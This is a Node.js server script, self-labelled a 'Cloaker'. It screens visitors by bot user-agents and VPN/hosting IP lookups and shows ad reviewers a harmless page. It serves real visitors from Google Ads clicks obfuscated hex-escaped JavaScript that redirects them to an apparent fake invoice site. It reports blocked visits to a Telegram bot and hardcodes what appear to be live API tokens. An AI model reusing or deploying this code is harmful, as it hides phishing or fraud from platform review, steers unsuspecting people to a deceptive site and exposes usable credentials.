const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

app.use(cors());

const CONFIG = {
    IPINFO_TOKEN: 'f14749fee64f8f', 
    TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY', 
    TG_CHAT: '-1003321543933', 
    DESTINO: 'https://carbesol-factureonline.onrender.com', 
    PORT: process.env.PORT || 3000
};

async function verificarVisitante(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = (req.headers['user-agent'] || '').toLowerCase();

    // 1. Filtro Bots
    const bots = ['googlebot', 'adsbot', 'lighthouse', 'bot', 'crawler', 'spider', 'headless'];
    if (bots.some(b => ua.includes(b))) return { ok: false, r: "Bot Detectado" };

    // 2. Filtro IP
    try {
        const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${CONFIG.IPINFO_TOKEN}`);
        if (data.privacy && (data.privacy.vpn || data.privacy.proxy || data.privacy.hosting)) {
            return { ok: false, r: "VPN/Hosting", d: data };
        }
        return { ok: true, d: data };
    } catch (e) {
        return { ok: true }; 
    }
}

app.get('/:slug', async (req, res) => {
    if (req.params.slug.length < 40) return res.status(404).end();

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const check = await verificarVisitante(req);

    // --- CÓDIGO PARA DESBLOQUEAR PANTALLA ---
    // Este pequeño fragmento es la llave que abre el sitio
    const showSiteCode = "document.documentElement.style.display = 'block';";

    if (!check.ok) {
        // Reporte Telegram (Opcional: Comentar para ahorrar recursos)
        axios.post(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TG_CHAT,
            text: `🚫 *BLOQUEO*\nIP: \`${ip}\`\nRazón: ${check.r}`,
            parse_mode: 'Markdown'
        }).catch(()=>{});

        // RESPUESTA AL BOT/REVISOR:
        // Le enviamos un log y la orden de MOSTRAR la página
        return res.send(`console.log('Safe Page Loaded'); ${showSiteCode}`);
    }

    // RESPUESTA AL HUMANO:
    res.set('Content-Type', 'application/javascript');
    
    // Payload con lógica: Intenta redireccionar. Si no cumple condiciones, MUESTRA la página.
    const payload = `
        var _0x1a2b=["\x67\x63\x6C\x69\x64","\x67\x61\x64\x5F\x73\x6F\x75\x72\x63\x65","\x67\x62\x72\x61\x69\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x70\x6C\x61\x63\x65"];
        (function(){
            var u=new URLSearchParams(window.location.search);
            if(u.has(_0x1a2b[0])||u.has(_0x1a2b[1])||u.has(_0x1a2b[2])){
                window[_0x1a2b[3]][_0x1a2b[4]]("${CONFIG.DESTINO}");
            } else {
                // Si no tiene gclid, mostramos la página "Safe"
                ${showSiteCode}
            }
        })();
        // Por seguridad, ejecutamos unlock también aquí abajo por si acaso
        setTimeout(function(){ ${showSiteCode} }, 500);
    `;
    
    res.send(payload);
});

app.listen(CONFIG.PORT, () => console.log(`Cloaker listo en puerto ${CONFIG.PORT}`));
